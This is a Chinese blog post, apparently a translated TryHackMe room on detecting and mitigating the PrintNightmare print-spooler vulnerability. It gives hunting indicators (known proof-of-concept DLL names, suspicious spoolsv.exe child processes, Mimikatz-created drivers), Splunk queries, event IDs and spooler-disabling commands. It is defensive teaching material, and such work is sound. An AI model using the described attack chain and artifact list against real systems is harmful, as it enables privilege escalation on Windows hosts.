+<p>Sygnia 分享了一些检测 PrintNightmare 的高级威胁搜寻技巧。 在寻找 PrintNightmare 时，您应该寻找以下内容：</p>
+<pre><code> 搜索 spoolsv.exe 进程，将 rundll32.exe 作为子进程启动，无需任何命令行参数
+ 考虑到 pcAddPrinterDriverEx() 函数的使用，您通常会发现恶意 DLL 被放入以下文件夹之一：%WINDIR%\system32\spool\drivers\x64\3\ 文件夹以及随后从 %WINDIR%\ 加载的 DLL。 system32\spool\drivers\x64\3\Old\ （您应该主动监视文件夹中是否有任何异常 DLL）
+ 寻找可疑的 spoolsv.exe 子进程（cmd.exe、powershell.exe 等）
+ 攻击者甚至可能使用 Mimikatz 来执行攻击，在这种情况下，将创建一个名为“QMS 810”的打印驱动程序。 这可以通过记录注册表更改（例如 Sysmon ID 13）来检测。
+ 搜索属于公开的概念验证代码一部分的 DLL，例如 MyExploit.dll、evil.dll、addCube.dll、rev.dll、rev2.dll、main64.dll、mimilib.dll。 如果它们存在于端点上，您可以在 Microsoft-Windows-PrintService 中通过事件 ID 808 找到它们。
+</code></pre>
+<p>Splunk 还出色地为我们提供了一些检测搜索查询：</p>
+<p>识别添加新打印机驱动程序的打印后台处理程序：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">source="WinEventLog:Microsoft-Windows-PrintService/Operational" </span><br><span class="line">EventCode=316 category = "Adding a printer driver" Message = "*kernelbase.dll,*" Message = "*UNIDRV.DLL,*" Message = "*.DLL.*" </span><br><span class="line">| stats count min(_time) as firstTime max(_time) as lastTime by OpCode EventCode ComputerName Message </span><br></pre></td></tr></tbody></table></figure>
+
+<p>检测 spoolsv.exe 及其子进程 rundll32.exe：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">| tstats count min(_time) as firstTime max(_time) as lastTime from </span><br><span class="line">datamodel=Endpoint.Processes where </span><br><span class="line">Processes.parent_process_name=spoolsv.exe </span><br><span class="line">Processes.process_name=rundll32.exe by Processes.dest Processes.user </span><br><span class="line">Processes.parent_process Processes.process_name Processes.process </span><br><span class="line">Processes.process_id Processes.parent_process_id</span><br></pre></td></tr></tbody></table></figure>
+
+<p>没有任何命令行参数的可疑 rundll32.exe 实例：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">| tstats count FROM datamodel=Endpoint.Processes where </span><br><span class="line">Processes.process_name=spoolsv.exe by _time Processes.process_id Processes.process_name Processes.dest </span><br><span class="line">| rename "Processes.*" as * </span><br><span class="line">| join process_guid _time </span><br><span class="line">    [| tstats count min(_time) as firstTime max(_time) as lastTime FROM datamodel=Endpoint.Filesystem where </span><br><span class="line">Filesystem.file_path="*\\spool\\drivers\\x64\\*" Filesystem.file_name="*.dll" by _time </span><br><span class="line">Filesystem.dest Filesystem.file_create_time Filesystem.file_name Filesystem.file_path </span><br><span class="line">    | rename "Filesystem.*" as * </span><br><span class="line">    | fields _time dest file_create_time file_name file_path process_name process_path process] </span><br><span class="line">| dedup file_create_time </span><br><span class="line">| table dest file_create_time, file_name, file_path, process_name</span><br></pre></td></tr></tbody></table></figure>
+
+<p>检测新打印机插件加载失败的情况：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">source="WinEventLog:Microsoft-Windows-PrintService/Admin" ((ErrorCode="0x45A" (EventCode="808" OR EventCode="4909")) </span><br><span class="line">OR ("The print spooler failed to load a plug-in module" OR "\\drivers\\x64\\")) </span><br><span class="line">  | stats count min(_time) as firstTime max(_time) as lastTime by OpCode EventCode ComputerName Message</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果您有兴趣学习Splunk，可以参考以下房间：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/splunk101">Splunk 101</a></li>
+<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/bpsplunk">Splunk</a></li>
+<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/splunk2gcd5">Splunk 2</a></li>
+<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/splunk3zs">Splunk 3</a></li>
+</ul>
+<h1 id="Detection-Windows-Event-Logs"><a href="#Detection-Windows-Event-Logs" class="headerlink" title="Detection: Windows Event Logs"></a>Detection: Windows Event Logs</h1><p><strong>Windows 事件日志是 Windows 操作系统创建的安全、系统和应用程序通知的详细记录。 有一些日志记录与后台打印程序活动相关的事件。 不过，默认情况下它们可能不会启用，需要使用 Windows 组策略或 Powershell 进行配置。</strong></p>
+<p>与 <strong>Print Spooler</strong> 活动相关的日志是：</p>
+<ul>
+<li><em><strong>Microsoft-Windows-PrintService/Admin</strong></em></li>
+<li><em><strong>Microsoft-Windows-PrintService/Operational</strong></em></li>
+</ul>
+<p>我们可以通过查看上述端点事件或 Windows 事件日志来检测 PrintNightmare 工件。</p>
+<p>您可以查找以下<strong>事件 ID</strong>：</p>
+<ul>
+<li><strong>Microsoft-Windows-PrintService/Operational</strong> (事件 ID <strong>316</strong>) - 查找 <em>“已添加或更新 Windows x64 版本 3 的打印机驱动程序 [文件]。文件：- UNIDRV .DLL、AddUser.dll、AddUser.dll 无需用户操作。”</em></li>
+<li><strong>Microsoft-Windows-PrintService/Admin</strong>（事件 ID <strong>808</strong>） - 安全事件源已尝试注册（可以检测 spoolsv.exe 加载的未签名驱动程序和恶意 DLL）</li>
+<li><strong>Microsoft-Windows-PrintService/Operational</strong>（事件 ID <strong>811</strong>） - 记录有关失败操作的信息。 该事件将提供有关删除的 DLL 的完整路径的信息。</li>
+<li><strong>Microsoft-Windows-SMBClient/Security</strong>（事件 ID <strong>31017</strong>） - 此事件 ID 还可用于检测 spoolsv.exe 加载的未签名驱动程序。</li>
+<li><strong>Windows 系统</strong>（事件 ID <strong>7031）</strong> - 服务停止操作（此事件 ID 将显示打印后台处理程序服务意外终止）。</li>
+</ul>
+<p><strong>您还可以使用Sysmon来检测PrintNightmare恐怖：</strong></p>
+<ul>
+<li><p><strong>Microsoft-Windows-Sysmon/Operational</strong>（事件 ID <strong>3</strong>） - 网络连接（查找可疑端口）</p>
+</li>
+<li><p><strong>Microsoft-Windows-Sysmon/Operational</strong> (Event ID <strong>11</strong>) - FileCreate（正在记录文件创建事件，您可以在打印后台处理程序的驱动程序目录中查找加载的 DLL：<em>C :\Windows\System32\spool\drivers\x64\3</em>)</p>
+</li>
+<li><p><strong>Microsoft-Windows-Sysmon/Operational</strong> (Event IDs <strong>23</strong>, <strong>26</strong>)  - FileDelete（您可以寻找已删除的恶意 DLL）</p>
+</li>
+</ul>
+<p>您仍在寻找 THMDepartment 以确定 PrintNightmare 攻击是否确实发生过。</p>
+<p>掌握了上述所有知识，您可以检测事件日志中的 PrintNightmare 工件吗？</p>
+<h1 id="Detection-Packet-Analysis"><a href="#Detection-Packet-Analysis" class="headerlink" title="Detection: Packet Analysis"></a>Detection: Packet Analysis</h1><p>数据包捕获 (pcap) 在检测妥协迹象方面发挥着至关重要的作用。</p>
+<p>如果您不熟悉 Wireshark，不用担心。 您可以加入 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/wireshark">Wireshark 101</a> 房间，了解有关 Wireshark 以及如何分析数据包捕获的更多信息。 这会很有趣！</p>
+<p>通过分析网络流量来检测 PrintNightmare 攻击，特别是针对（CVE-2021-1675 和 CVE-2021-34527）攻击，并不像检查受害者计算机上的 Windows 事件日志等工件那么容易。 攻击者依赖使用 <a target="_blank" rel="noopener" href="https://wiki.wireshark.org/DCE/RPC">DCE/RPC 命令</a> <strong>RpcAddPrinterDriver</strong> 或 <strong>RpcAddPrinterDriverEx</strong> 添加打印机驱动程序。</p>
+<p><strong>DCE/RPC</strong> 代表<strong>分布式计算环境/远程过程调用</strong>，是建立 API 和网络协议的远程过程调用。 但是，使检测攻击变得更加困难的是 <strong>RpcAddPrinterDriver</strong> 或 <strong>RpcAddPrinterDriverEx</strong> 命令的合法用途，因此您不能总是仅依靠网络流量分析来确信 PrintNightmare 攻击发生在您的计算机中。 环境。 根据 <a target="_blank" rel="noopener" href="https://corelight.com/blog/why-is-printnightmare-hard-to-detect">Corelight</a>，它可能会变得更难检测，特别是如果漏洞将 DCE/RPC 调用包装在 [SMB3 中] 加密。 ](<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/storage/file-server/smb-security#:~:text=SMB">https://docs.microsoft.com/en-us/windows-server/storage/file-server/smb-security#:~:text=SMB</a> 加密在不受信任的网络上提供端到端的窃听事件。&amp;text= 可以配置 SMB 加密，其中数据穿越不受信任的网络。）要识别加密的 DCE/RPC 调用，您需要以某种方式解密和解码有效负载，这是一项耗时的任务。</p>
+<p>Corelight 还发布了一个 <a target="_blank" rel="noopener" href="https://github.com/corelight/CVE-2021-1675">Zeek 包</a>，用于检测未加密的 DCE/RPC 命令上添加的打印机驱动程序。</p>
+<p>此任务附带的是来自 PrintNightmare 攻击的 PCAP，您可以下载并在本地 Wireshark 实例中打开。</p>
+<h1 id="Mitigation-Disable-Print-Spooler"><a href="#Mitigation-Disable-Print-Spooler" class="headerlink" title="Mitigation: Disable Print Spooler"></a>Mitigation: Disable Print Spooler</h1><p>这不仅仅是一场噩梦，现在您可以 100% 确信这是针对 THMDepartment 的 PrintNightmare 攻击。 您检查了网络上的其他域控制器，它们似乎是干净的。</p>
+<p>现在还不是世界末日。 您仍然可以通过禁用所有域控制器上的后台打印程序并修改注册表设置（如果适用）来减轻或防御攻击。 你怎么能这样做？</p>
+<p><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">Microsoft</a>提供了检测Print Spooler服务是否已启用以及如何禁用它们的步骤：</p>
+<p><strong>首先，您需要确定 Print Spooler 服务是否正在运行。</strong></p>
+<p>在 Windows PowerShell 中运行以下命令（以管理员身份运行）：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Get-Service -Name Spooler</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果后台打印程序正在运行或该服务未设置为禁用，则选择以下选项之一以禁用后台打印程序服务或通过组策略禁用入站远程打印。</p>
+<p><strong>选项 1) 禁用打印后台处理程序服务：</strong></p>
+<p>如果禁用打印后台处理程序服务适合您的环境，请使用以下 PowerShell 命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Stop-Service -Name Spooler -Force</span><br><span class="line">Set-Service -Name Spooler -StartupType Disabled</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>注意</strong>：通过禁用后台打印程序服务，您将无法进行本地和远程打印。</p>
+<p><strong>选项 2) 通过组策略禁用入站远程打印：</strong></p>
+<p>通过组策略的设置可以配置如下：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Computer Configuration / Administrative Templates / Printers</span><br></pre></td></tr></tbody></table></figure>
+
+<p>禁用“<strong>允许打印后台处理程序接受客户端连接</strong>”*策略以阻止远程攻击。</p>
+<p>此策略将通过阻止入站远程打印操作来阻止远程攻击媒介。 系统将不再作为打印服务器运行，但到直接连接的设备的本地打印仍然可以工作。</p>
+<p><strong>注意</strong>：请记住，为了使组策略在整个域甚至本地计算机上生效，您需要发出“gpupdate /force”命令。</p>
+<p>有关详细信息，请参阅：[使用组策略设置来控制打印机。](<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/printing/use-group-policy-to-control-ad">https://docs.microsoft.com/en-us/troubleshoot/windows-server/printing/use-group-policy-to-control-ad</a> -打印机）</p>
+<p>Microsoft 于 7 月发布了适用于 Windows Server 2012、Windows Server 2016 和 Windows 10 版本 1607 的<a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">安全更新</a> 2021 年 7 月。</p>
+<p>除了安装 Microsoft 推荐的更新之外，还应采取其他缓解措施：</p>
+<p>您必须确认以下注册表设置已设置为 0（零）或未定义（注意：默认情况下，下面提到的注册表项不存在，因此已处于安全设置。），还要检查您的组策略 设置正确（请参阅<a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">常见问题解答</a>）：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>NoWarningNoElevationOnInstall</strong> = <strong>0</strong> (DWORD) 或未定义（默认设置）</p>
+<p><strong>UpdatePromptSettings</strong> = <strong>0</strong> (DWORD) 或未定义（默认设置）</p>
+<p><strong>注意</strong>：将 <strong>NoWarningNoElevationOnInstall</strong> 设置为 1 会使您的系统在设计上容易受到攻击。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/04/28/THMPrintNightmare/">http://mikannse.space/2024/04/28/THMPrintNightmare/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/windows/">windows</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/29/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%80%E5%9B%9B)%E4%B9%8BTHMAllSignsPoint2Pwnage/" title="打靶记录(一一四)之THMAllSignsPoint2Pwnage"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">打靶记录(一一四)之THMAllSignsPoint2Pwnage</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/28/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%80%E4%B8%89)%E4%B9%8BTHMAnthem/" title="打靶记录(一一三)之THMAnthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">打靶记录(一一三)之THMAnthem</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/04/02/IceTHM/" title="IceTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-02</div><div class="title">IceTHM</div></div></a></div><div><a href="/2024/08/02/THMBypassingUAC/" title="THMBypassingUAC"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-02</div><div class="title">THMBypassingUAC</div></div></a></div><div><a href="/2023/09/29/THMWindowsPrivEsc%E6%88%BF%E9%97%B4walkthrough/" title="THMWindowsPrivEsc房间walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-29</div><div class="title">THMWindowsPrivEsc房间walkthrough</div></div></a></div><div><a href="/2024/08/01/THMWindowsLocalPersistence/" title="THMWindowsLocalPersistence"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-01</div><div class="title">THMWindowsLocalPersistence</div></div></a></div><div><a href="/2024/07/31/THMWindowsPrivilegeEscalation/" title="THMWindowsPrivilegeEscalation"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-31</div><div class="title">THMWindowsPrivilegeEscalation</div></div></a></div><div><a href="/2024/04/30/THMZeroLogon/" title="THMZeroLogon"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-30</div><div class="title">THMZeroLogon</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-Print-Spooler-Service"><span class="toc-number">2.</span> <span class="toc-text">Windows Print Spooler Service</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Remote-Code-Execution-Vulnerability"><span class="toc-number">3.</span> <span class="toc-text">Remote Code Execution Vulnerability</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Try-it-yourself"><span class="toc-number">4.</span> <span class="toc-text">Try it yourself!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Indicators-of-Compromise"><span class="toc-number">5.</span> <span class="toc-text">Indicators of Compromise</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Detection-Windows-Event-Logs"><span class="toc-number">6.</span> <span class="toc-text">Detection: Windows Event Logs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Detection-Packet-Analysis"><span class="toc-number">7.</span> <span class="toc-text">Detection: Packet Analysis</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mitigation-Disable-Print-Spooler"><span class="toc-number">8.</span> <span class="toc-text">Mitigation: Disable Print Spooler</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成">Git速成</a><time datetime="2024-10-05T04:57:08.000Z" title="发表于 2024-10-05 12:57:08">2024-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%8C)%E4%B9%8BVulnHubCorrosion2/" title="打靶记录(一六二)之VulnHubCorrosion2">打靶记录(一六二)之VulnHubCorrosion2</a><time datetime="2024-10-03T09:24:11.000Z" title="发表于 2024-10-03 17:24:11">2024-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%80)%E4%B9%8BVulnHubDrippingBlues1/" title="打靶记录(一六一)之VulnHubDrippingBlues1">打靶记录(一六一)之VulnHubDrippingBlues1</a><time datetime="2024-10-02T05:16:28.000Z" title="发表于 2024-10-02 13:16:28">2024-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2024/04/28/THMPrintNightmare/'
+    this.page.identifier = '/2024/04/28/THMPrintNightmare/'
+    this.page.title = 'THMPrintNightmare'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
